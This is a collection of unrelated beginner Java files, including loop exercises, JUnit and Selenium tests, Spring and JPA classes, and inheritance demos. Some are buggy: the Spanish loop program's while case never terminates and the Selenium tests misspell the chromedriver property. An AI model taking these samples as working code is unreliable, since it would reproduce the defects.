    "import java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"entre un numero: \");\n        int n = scanner.nextInt();\n        System.out.print(\"elija un tipo de bucle (for/while/do-while): \");\n        String eleccion = scanner.next();\n        int sum=0;\n        int i=1;\n        // Usando  a while bucle\n\n\n        switch (eleccion) {\n            case \"for\":\n                for (;i <= n;i++) {\n                    sum +=i*i;\n                    System.out.println(\"Suma usando el bucle: \" + sum);\n                }\n                break;\n\n\n            // Usando el  do-while bucle\n\n            case \"while\": {\n                while (i <= n);\n                sum += i * i;\n                i++;\n            }\n            break;\n\n            // usando  a for bucle\n            case \"do-while\":\n                do {\n                    sum +=i*i;\n                    i++;\n                } while (i<= n);\n                break;\n\n            default: {\n                System.out.println(\"el numero que digito no es valido\");\n                return;\n            }\n        }\n    }\n}",
    "package org.peaksoft;\n\n\nimport org.junit.Assert;\nimport org.junit.Test;\nimport org.peaksoft.model.Car;\nimport org.peaksoft.model.User;\nimport org.peaksoft.service.CarServiceImpl;\nimport org.peaksoft.service.Service;\nimport org.peaksoft.service.UserServiceImpl;\n\nimport java.time.LocalDate;\nimport java.util.List;\n\npublic class UserServiceTest {\n\n    private final Service<User> userService = new UserServiceImpl();\n    private final Service<Car> carService = new CarServiceImpl();\n    private final User testUser = new User(\"Tom\", \"Hardy\", (byte) 46, 1L);\n    private final Car testCar = new Car(\"BMW\", LocalDate.of(2020, 10, 20), \"Black\");\n\n    @Test\n    public void dropUsersTable() {\n        try {\n            userService.dropTable();\n            userService.dropTable();\n        } catch (Exception e) {\n            Assert.fail(\"\u041f\u0440\u0438 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e);\n        }\n    }\n\n    @Test\n    public void createUsersTable() {\n        try {\n            userService.dropTable();\n            carService.createTable();\n            userService.createTable();\n        } catch (Exception e) {\n            Assert.fail(\"\u041f\u0440\u0438 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e.getMessage());\n        }\n    }\n\n    @Test\n    public void saveUser() {\n        try {\n            userService.dropTable();\n            userService.createTable();\n            carService.save(testCar);\n            userService.save(testUser);\n            User user = userService.getAll().get(0);\n\n            if (!testUser.getName().equals(user.getName())\n                    || !testUser.getLastName().equals(user.getLastName())\n                    || testUser.getAge() != user.getAge()\n            ) {\n                Assert.fail(\"User \u0431\u044b\u043b \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432 \u0431\u0430\u0437\u0443 \u0434\u0430\u043d\u043d\u044b\u0445\");\n            }\n\n        } catch (Exception e) {\n            Assert.fail(\"\u0412\u043e \u0432\u0440\u0435\u043c\u044f \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e);\n        }\n    }\n\n    @Test\n    public void removeUserById() {\n        try {\n            userService.dropTable();\n            userService.createTable();\n            userService.save(testUser);\n            userService.removeById(1L);\n        } catch (Exception e) {\n            Assert.fail(\"\u041f\u0440\u0438 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u043f\u043e id \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e);\n        }\n    }\n\n    @Test\n    public void getAllUsers() {\n        try {\n            userService.dropTable();\n            userService.createTable();\n            userService.save(testUser);\n            List<User> userList = userService.getAll();\n\n            if (userList.size() != 1) {\n                Assert.fail(\"\u041f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0441\u0442\u044c \u0440\u0430\u0431\u043e\u0442\u044b \u043c\u0435\u0442\u043e\u0434\u0430 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f/\u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u0438\u043b\u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b\");\n            }\n        } catch (Exception e) {\n            Assert.fail(\"\u041f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u0434\u043e\u0441\u0442\u0430\u0442\u044c \u0432\u0441\u0435\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u0438\u0437 \u0431\u0430\u0437\u044b \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e);\n        }\n    }\n\n    @Test\n    public void cleanUsersTable() {\n        try {\n            userService.dropTable();\n            userService.createTable();\n            userService.save(testUser);\n            userService.cleanTable();\n\n            if (userService.getAll().size() != 0) {\n                Assert.fail(\"\u041c\u0435\u0442\u043e\u0434 \u043e\u0447\u0438\u0449\u0435\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u0440\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d \u043d\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\");\n            }\n        } catch (Exception e) {\n            Assert.fail(\"\u041f\u0440\u0438 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438 \u043e\u0447\u0438\u0441\u0442\u043a\u0438 \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e);\n        }\n    }\n\n    @Test\n    public void getUserById() {\n        try {\n            userService.dropTable();\n            userService.createTable();\n            userService.save(testUser);\n            User user = userService.getById(1L);\n            if (!testUser.getName().equals(user.getName())\n                    || !testUser.getLastName().equals(user.getLastName())\n                    || testUser.getAge() != user.getAge()) {\n                Assert.fail(\"\u0412\u044b\u0448\u043b\u043e \u043e\u0448\u0438\u0431\u043a\u0430\");\n            }\n\n        } catch (Exception e) {\n            Assert.fail(\"\u0412\u043e \u0432\u0440\u0435\u043c\u044f \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u043f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u043e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\" + e);\n        }\n    }\n}\n",
    "package ders20;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nimport java.util.List;\n\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.chrome.ChromeDriver;\n\nclass OdevTest {\n\n\t@Test\n\tvoid firstTest() {\n\n\t\tSystem.setProperty(\"webdirever.chrome.driver\", \"drivers/chromedriver\");\n\t\tWebDriver driver = new ChromeDriver();\n\n\t\tdriver.get(\"https://demoqa.com/elements\");\n\n\t\tWebElement buttonClick = driver.findElement(new By.ByCssSelector(\".btn[id=item-4]\"));\n\t\tbuttonClick.click();\n\n\t\tList<WebElement> clickMeButton = driver.findElements(new By.ByCssSelector(\".btn-primary\"));\n\n\t\tclickMeButton.get(2).click();\n\n\t\tWebElement dynamicText = driver.findElement(new By.ByCssSelector(\"#dynamicClickMessage\"));\n\t\tString text = dynamicText.getText();\n\t\tSystem.out.println(text);\n\n\t}\n\n\t@Test\n\tvoid secondTest() {\n\n\t\tSystem.setProperty(\"webdirever.chrome.driver\", \"drivers/chromedriver\");\n\t\tWebDriver driver = new ChromeDriver();\n\n\t\tdriver.get(\"https://demoqa.com/webtables\");\n\n\t\tWebElement addButton = driver.findElement(new By.ByCssSelector(\".btn-primary\"));\n\t\taddButton.click();\n\t\t\n\t\tWebElement firstName = driver.findElement(new By.ByCssSelector(\"#firstName\"));\n\t\tfirstName.click();\n\t\tfirstName.sendKeys(\"Emre\");\n\t\t\n\t\tWebElement lastName = driver.findElement(new By.ByCssSelector(\"#lastName\"));\n\t\tlastName.click();\n\t\tlastName.sendKeys(\"Eser\");\n\t\t\n\t\tWebElement userEmail = driver.findElement(new By.ByCssSelector(\"#userEmail\"));\n\t\tuserEmail.click();\n\t\tuserEmail.sendKeys(\"emre.eser@sebit.com.tr\");\n\t\t\n\t\tWebElement age = driver.findElement(new By.ByCssSelector(\"#age\"));\n\t\tage.click();\n\t\tage.sendKeys(\"28\");\n\t\t\n\t\tWebElement salary = driver.findElement(new By.ByCssSelector(\"#salary\"));\n\t\tsalary.click();\n\t\tsalary.sendKeys(\"34000\");\n\t\t\n\t\tWebElement department = driver.findElement(new By.ByCssSelector(\"#department\"));\n\t\tdepartment.click();\n\t\tdepartment.sendKeys(\"IT\");\n\t\t\n\t\tWebElement submitButton = driver.findElement(new By.ByCssSelector(\"#submit\"));\n\t\tsubmitButton.click();\n\t\t\n\t\tWebElement editButton = driver.findElement(new By.ByCssSelector(\"#edit-record-4\"));\n\t\teditButton.click();\n\t\t\n\t\tWebElement editFirstName = driver.findElement(new By.ByCssSelector(\"#firstName\"));\n\t\teditFirstName.click();\n\t\teditFirstName.clear();\n\t\teditFirstName.sendKeys(\"Kenan\");\n\t\t\n\t\tWebElement editSubmitButton = driver.findElement(new By.ByCssSelector(\"#submit\"));\n\t\teditSubmitButton.click();\n\n\n\n\n\n\t\t\n\n\n\n\n\t\t\n\t\t\n\n\n\n\n\n\t}\n\n}\n",
    "class Info{\n    String name;\n    String location;\npublic Info(String name,String location){\n    this.name=name;\n    this.location=location;\n}\n\n    public String getLocation() {\n        return location;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void display(){\n    System.out.println(\"Name : \"+getName());\n    System.out.println(\"Location : \"+getLocation());\n}\n}\nclass Departments extends Info{\n    int no_of_departments;\n    public Departments(String name,String location,int no_of_departments){\n        super(name,location);\n        this.no_of_departments=no_of_departments;\n    }\n\n    public int getNo_of_departments() {\n        return no_of_departments;\n    }\n\n    public void display(){\n        super.display();\n        System.out.println(\"Total departments : \"+getNo_of_departments());\n    }\n}\nclass topDepartments extends Departments{\n    String dept1;\n    String dept2;\n    String dept3;\n    public topDepartments(String name,String location, int no_of_departments,String dept1,String dept2,String dept3) {\n        super(name, location, no_of_departments);\n        this.dept1 = dept1;\n        this.dept2 = dept2;\n        this.dept3 = dept3;\n    }\n\n    public String getDept1() {\n        return dept1;\n    }\n\n    public String getDept2() {\n        return dept2;\n    }\n\n    public String getDept3() {\n        return dept3;\n    }\n\n    public void display(){\n       super.display();\n        System.out.println(\"Top Departments\");\n        System.out.println(\"Department 1 : \"+getDept1());\n        System.out.println(\"Department 2 : \"+getDept2());\n        System.out.println(\"Department 3 : \"+getDept3());\n    }\n}\nclass Approved extends topDepartments{\n    String PEC;\n    String HEC;\n    public Approved(String name,String location, int no_of_departments,String dept1,String dept2,String dept3,String PEC,String HEC){\n     super(name,location,no_of_departments,dept1,dept2,dept3);\n     this.PEC=PEC;\n     this.HEC=HEC;\n    }\n\n    public String getPEC() {\n        return PEC;\n    }\n\n    public String getHEC() {\n        return HEC;\n    }\n\n    public void display(){\n        super.display();\n        System.out.println(\"PEC approved : \"+getPEC());\n        System.out.println(\"HEC approved : \"+getHEC());\n    }\n}\nclass University extends Approved {\n    public University(String name, String location, int no_of_departments, String dept1, String dept2, String dept3, String PEC, String HEC) {\n        super(name, location, no_of_departments, dept1, dept2, dept3, PEC, HEC);\n    }\n    public void display() {\n        System.out.println(\"UNIVERSITY DETAILS\");\n        super.display();\n        System.out.println();\n    }\n    }\n    public class Project{\n        public static void main(String[] args) {\n            University u1 = new University(\"Dawood University\", \"Karachi\", 18, \"Chemical Engineering\", \"Industrial Engineering\", \"Petroleum Engineering\", \"yes\", \"Yes\");\n            University u3= new University(\"Nust University\",\"Islamabad\",31,\"Computer Science\",\"Chemical Engineering\",\"Electornic Engineering\",\"yes\",\"yes\") ;\n            University u2 = new University(\"Ned University\", \"Karachi\", 26, \"Software Engineering\", \"Electrical Engineering\", \"Mechincal Engineering\", \"yes\", \"yes\");\n           u1.display();\n           u2.display();\n           u3.display();\n        }\n    }",
    "package cuonghtph34430.poly.lab6_api.model;\n\npublic class Response <T>{\n    private int status;\n    private String messenger;\n    private T data;\n    private String token;\n    private String refreshToken;\n\n\n    public Response(int status, String messenger, T data) {\n        this.status = status;\n        this.messenger = messenger;\n        this.data = data;\n    }\n\n    public Response() {\n    }\n\n    public String getToken() {\n        return token;\n    }\n\n    public void setToken(String token) {\n        this.token = token;\n    }\n\n    public String getRefreshToken() {\n        return refreshToken;\n    }\n\n    public void setRefreshToken(String refreshToken) {\n        this.refreshToken = refreshToken;\n    }\n\n    public int getStatus() {\n        return status;\n    }\n\n    public void setStatus(int status) {\n        this.status = status;\n    }\n\n    public String getMessenger() {\n        return messenger;\n    }\n\n    public void setMessenger(String messenger) {\n        this.messenger = messenger;\n    }\n\n    public T getData() {\n        return data;\n    }\n\n    public void setData(T data) {\n        this.data = data;\n    }\n}\n\n",
    "package com.diSmartCoder.ems.controller;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.CrossOrigin;\nimport org.springframework.web.bind.annotation.DeleteMapping;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.PutMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport com.diSmartCoder.ems.exception.ResourceNotFoundException;\nimport com.diSmartCoder.ems.model.Employee;\nimport com.diSmartCoder.ems.repository.EmployeeRepository;\n\n@RestController\n@RequestMapping(\"/api/v1\")\n@CrossOrigin(\"*\")\npublic class EmployeeController {\n\n\t@Autowired\n\tprivate EmployeeRepository employeeRepository;\n\n\t// Get all employees\n\n\t@GetMapping(\"/employees\")\n\tpublic List<Employee> getAllEmployees() {\n\t\treturn employeeRepository.findAll();\n\t}\n\n\t// Create employee rest API\n\n\t@PostMapping(\"/employees\")\n\tpublic Employee createEmployee(@RequestBody Employee employee) {\n\t\treturn employeeRepository.save(employee);\n\t}\n\n\t// Get employee by id rest API\n\n\t@GetMapping(\"/employees/{id}\")\n\tpublic ResponseEntity<Employee> getEmployeeById(@PathVariable Long id) {\n\t\tEmployee employee = employeeRepository.findById(id)\n\t\t\t\t.orElseThrow(() -> new ResourceNotFoundException(\"Employee not exists eith id \" + id));\n\n\t\treturn ResponseEntity.ok(employee);\n\n\t}\n\n\t// Update employee rest API\n\n\t@PutMapping(\"/employees/{id}\")\n\tpublic ResponseEntity<Employee> updateEmployee(@PathVariable Long id, @RequestBody Employee employeeDetails) {\n\t\tEmployee employee = employeeRepository.findById(id)\n\t\t\t\t.orElseThrow(() -> new ResourceNotFoundException(\"Employee not exists with id \" + id));\n\n\t\temployee.setFirstName(employeeDetails.getFirstName());\n\t\temployee.setLastName(employeeDetails.getLastName());\n\t\temployee.setEmailId(employeeDetails.getEmailId());\n\n\t\tEmployee updatedEmployee = employeeRepository.save(employee);\n\n\t\treturn ResponseEntity.ok(updatedEmployee);\n\t}\n\n\t// Delete employee rest API\n\t@DeleteMapping(\"/employees/{id}\")\n\tpublic ResponseEntity<Map<String, Boolean>> deleteEmployee(@PathVariable Long id){\n\t\tEmployee employee  = employeeRepository.findById(id).orElseThrow(() -> new ResourceNotFoundException(\"Employee not exist with id : \" +id));\n\t\temployeeRepository.delete(employee);\n\t\tMap<String, Boolean> response = new HashMap<>();\n\t\tresponse.put(\"deleted\", Boolean.TRUE);\n\t\treturn ResponseEntity.ok(response);\n\t}\n\t\n}\n",
    "package Inc.RedCode.ProjectTrasnport;\n\n/* \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430 \u0434\u043b\u044f \u043d\u0430\u0437\u0435\u043c\u043d\u043e\u0433\u043e \u0442\u0440\u0430\u043d\u0441\u043f\u043e\u0440\u0442\u0430 (\u0442\u043e \u0435\u0441\u0442\u044c \u043d\u0430\u0431\u043e\u0440 \u043e\u0431\u0449\u0438\u0445 \u0445\u0430\u0440\u0430\u043a\u0442\u0435\u0440\u0438\u0441\u0442\u0438\u043a,\n\u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043f\u0440\u0438\u043c\u0435\u043d\u0438\u043c\u044b \u043a \u043b\u044e\u0431\u043e\u043c\u0443 \u0442\u0438\u043f\u0443 \u043d\u0430\u0437\u0435\u043c\u043d\u043e\u0433\u043e \u0442\u0440\u0430\u043d\u0441\u043f\u043e\u0440\u0442\u0430).\n\u042d\u0442\u043e \u0438 \u0435\u0441\u0442\u044c \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0446\u0438\u044f.\n\u0410\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u041d\u0415\u041b\u042c\u0417\u042f \u0432\u044b\u0437\u0432\u0430\u0442\u044c \u0432 MainClass. \u042d\u0442\u043e \u0438 \u0435\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u043e\u0442\u043b\u0438\u0447\u0438\u0435 \u043e\u0442 \u043e\u0431\u044b\u0447\u043d\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430, \u0443 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e\n\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \u0435\u0441\u0442\u044c \u043d\u0430\u0441\u043b\u0435\u0434\u043d\u0438\u043a(\u0438).\n\n\u041c\u0435\u0442\u043e\u0434\u044b, \u043f\u043e\u043b\u044f, \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u044b  \u044d\u0442\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430 \u043c\u043e\u0436\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0434\u043b\u044f \u0434\u0440\u0443\u0433\u0438\u0445 \u043a\u043b\u0430\u0441\u0441\u043e\u0432 (\u0434\u043e\u0447\u0435\u0440\u043d\u0438\u0445/\u043d\u0430\u0441\u043b\u0435\u0434\u043d\u0438\u043a\u043e\u0432)(\u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440: Truck)\n\u042d\u0442\u043e \u0438 \u0435\u0441\u0442\u044c \u043a\u043e\u043d\u0446\u0435\u043f\u0446\u0438\u044f \u043d\u0430\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u043d\u0438\u044f. */\npublic abstract class Ground_Transport {\n\n    private String Name; //\u0418\u043d\u043a\u0430\u043f\u0441\u0443\u043b\u044f\u0446\u0438\u044f. Private - \u0437\u043d\u0430\u0447\u0438\u0442 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f(\u043f\u043e\u043b\u0435) \u0431\u0443\u0434\u0435\u0442 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u0430 \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u043d\u0443\u0442\u0440\u0438 \u043a\u043b\u0430\u0441\u0441\u0430.\n    protected double FuelTank; //Protected - \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u0430 \u0432\u043d\u0443\u0442\u0440\u0438 \u043a\u043b\u0430\u0441\u0441\u0430 \u0438 \u0432 \u043f\u0440\u0435\u0434\u0435\u043b\u0430\u0445 package.\n    private double FloatOfVehicle;\n    private char Color;\n    private int CountOfWheels;\n    private int CountOfDoors;\n\n\n    /*\u0421\u043e\u0437\u0434\u0430\u043b\u0438 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 (\u0442\u043e, \u0447\u0442\u043e \u0432\u044b\u0434\u0435\u043b\u0438\u0442 \u043f\u0430\u043c\u044f\u0442\u044c \u0432 \u041e\u0417\u0423 \u0434\u043b\u044f \u0431\u0443\u0434\u0443\u0449\u0435\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 \u043a\u043b\u0430\u0441\u0441\u0430 \u0438 \u0432\u0435\u0440\u043d\u0451\u0442 \u0441\u0441\u044b\u043b\u043a\u0443 \u043d\u0430 \u044d\u0442\u043e \u043c\u0435\u0441\u0442\u043e \u0432 \u041e\u0417\u0423).\n    \u0421\u044e\u0434\u0430 \u0436\u0435 \u043c\u044b \u0441\u0440\u0430\u0437\u0443 \u0437\u0430\u0434\u0430\u0435\u043c \u0441\u0432\u043e\u0438 \u043f\u043e\u043b\u044f (\u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b) \u043f\u0440\u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0438 \u043e\u0431\u044a\u0435\u043a\u0442\u0430.\n     */\n    public Ground_Transport(String name, double fuelTank, double floatOfVehicle, char color, int countOfWheels, int countOfDoors){\n        Name  =  name;\n        FuelTank = fuelTank;\n        FloatOfVehicle = floatOfVehicle;\n        Color = color;\n        CountOfWheels = countOfWheels;\n        CountOfDoors = countOfDoors;\n    }\n\n    public abstract double getSpendOfWay();//\u0410\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0432 \u0434\u0440\u0443\u0433\u0438\u0445 \u043a\u043b\u0430\u0441\u0441\u0430\u0445.\n\n\n    public void ShowAllInfo(){ //\u041c\u0435\u0442\u043e\u0434 \u043f\u043e\u043a\u0430\u0437\u0430 \u0432\u0441\u0435\u0439 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438.\n        System.out.println(\"\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435: \" + Name);\n        System.out.println(\"\u041e\u0431\u044a\u0435\u043c \u0442\u043e\u043f\u043b\u0438\u0432\u0430/\u0431\u0430\u043a\u0430 \" + FuelTank);\n        System.out.println(\"\u0418\u0437\u043d\u043e\u0448\u0435\u043d\u043d\u043e\u0441\u0442\u044c: \" + FloatOfVehicle);\n        System.out.println(\"\u0426\u0432\u0435\u0442: \" + Color);\n        System.out.println(\"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043a\u043e\u043b\u0451\u0441: \" + CountOfWheels);\n        System.out.println(\"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0434\u0432\u0435\u0440\u0435\u0439: \" + CountOfDoors);\n\n    }\n\n}\n",
    "package com.generation.lojadegames.model;\n\nimport java.math.BigDecimal;\n\nimport com.fasterxml.jackson.annotation.JsonIgnoreProperties;\n\nimport jakarta.persistence.Column;\nimport jakarta.persistence.Entity;\nimport jakarta.persistence.GeneratedValue;\nimport jakarta.persistence.GenerationType;\nimport jakarta.persistence.Id;\nimport jakarta.persistence.ManyToOne;\nimport jakarta.persistence.Table;\nimport jakarta.validation.constraints.NotBlank;\nimport jakarta.validation.constraints.NotNull;\nimport jakarta.validation.constraints.Size;\n\n\n\t@Entity\n\t@Table(name = \"tb_produto\")\n\tpublic class Produto {\n\n\t\t@Id\n\t\t@GeneratedValue(strategy = GenerationType.IDENTITY) \n\t\tprivate long id;\n\t\t\n\t\t@NotBlank(message = \"O atributo Nome \u00e9 Obrigat\u00f3rio\")\n\t\t@Size(min = 5, max = 100, message = \"Tamanho m\u00ednimo: 5, maximo: 100\")\n\t\tprivate String nome;\n\t\t\n\t\t@NotBlank(message = \"O atributo Descri\u00e7\u00e3o \u00e9 Obrigat\u00f3rio\")\n\t\t@Size(min = 10, max = 1000, message = \"Tamanho m\u00ednimo: 10, maximo: 1000\")\n\t\tprivate String descricao;\n\t\t\n\t\t@NotBlank(message = \"O atributo Console \u00e9 Obrigat\u00f3rio\")\n\t\t@Size(min = 10, max = 100, message = \"Tamanho m\u00ednimo: 10, maximo: 100\")\n\t\tprivate String console;\n\t\t\n\t\t@NotNull(message = \"O atributo Quantidade \u00e9 Obrigat\u00f3rio\")\n\t\tprivate int quantidade;\n\t\t\n\t\t@NotNull(message = \"O atributo pre\u00e7o \u00e9 Obrigat\u00f3rio\")\n\t\t@Column(precision = 8, scale = 2) \n\t\tprivate BigDecimal preco;\n\t\t\n\t\t@NotBlank(message = \"O atributo foto \u00e9 Obrigat\u00f3rio\")\n\t\tprivate String foto;\n\n\t\t@ManyToOne\n\t\t@JsonIgnoreProperties(\"produto\")\n\t\tprivate Categoria categoria;\n\t\t\n\t\tpublic long getId() {\n\t\t\treturn id;\n\t\t}\n\n\t\tpublic void setId(long id) {\n\t\t\tthis.id = id;\n\t\t}\n\n\t\tpublic String getNome() {\n\t\t\treturn nome;\n\t\t}\n\n\t\tpublic void setNome(String nome) {\n\t\t\tthis.nome = nome;\n\t\t}\n\n\t\tpublic String getDescricao() {\n\t\t\treturn descricao;\n\t\t}\n\n\t\tpublic void setDescricao(String descricao) {\n\t\t\tthis.descricao = descricao;\n\t\t}\n\n\t\tpublic String getConsole() {\n\t\t\treturn console;\n\t\t}\n\n\t\tpublic void setConsole(String console) {\n\t\t\tthis.console = console;\n\t\t}\n\n\t\tpublic int getQuantidade() {\n\t\t\treturn quantidade;\n\t\t}\n\n\t\tpublic void setQuantidade(int quantidade) {\n\t\t\tthis.quantidade = quantidade;\n\t\t}\n\n\t\tpublic BigDecimal getPreco() {\n\t\t\treturn preco;\n\t\t}\n\n\t\tpublic void setPreco(BigDecimal preco) {\n\t\t\tthis.preco = preco;\n\t\t}\n\n\t\tpublic String getFoto() {\n\t\t\treturn foto;\n\t\t}\n\n\t\tpublic void setFoto(String foto) {\n\t\t\tthis.foto = foto;\n\t\t}\n\n\t\tpublic Categoria getCategoria() {\n\t\t\treturn categoria;\n\t\t}\n\n\t\tpublic void setCategoria(Categoria categoria) {\n\t\t\tthis.categoria = categoria;\n\t\t}\n\n\t\t\n}\n",
    "import java.util.ArrayList;\nimport java.util.List;\n\npublic class HotDrinksVM implements VendingMachine{\n    private List<Product> products;\n\n    public void initProducts(List<Product> productList) {\n        this.products = productList;\n    }\n\n    @Override\n    public Product getProduct(String name) {\n        for (Product product : products) {\n            if (product.getName().equals(name)) {\n                return product;\n            }\n        }\n        return null;\n    }\n\n    public Product getProduct(String name, double volume, int temperature) {\n        for (Product product : products) {\n            if (product.getName().equals(name) && product.getVolume() == volume && product.getTemperature() == temperature) {\n                return product;\n            }\n        }\n        return null;\n    }\n\n    public static void main(String[] args) {\n        HotDrinksVM hotdrinksVM = new HotDrinksVM();\n\n        List<Product> listHotDrinks = new ArrayList<>();\n        listHotDrinks.add(new HotDrink(\"Espresso\", 0.05, 93));\n        listHotDrinks.add(new HotDrink(\"Cappuccino\", 0.17, 70));\n        listHotDrinks.add(new HotDrink(\"Americano\", 0.22, 85));\n\n\n        hotdrinksVM.initProducts(listHotDrinks);\n\n        System.out.println(hotdrinksVM.getProduct(\"Espresso\", 0.05, 93));\n        System.out.println(hotdrinksVM.getProduct(\"Cappuccino\", 0.17, 70));\n        System.out.println(hotdrinksVM.getProduct(\"Americano\", 0.22, 85));\n    }\n}\n",
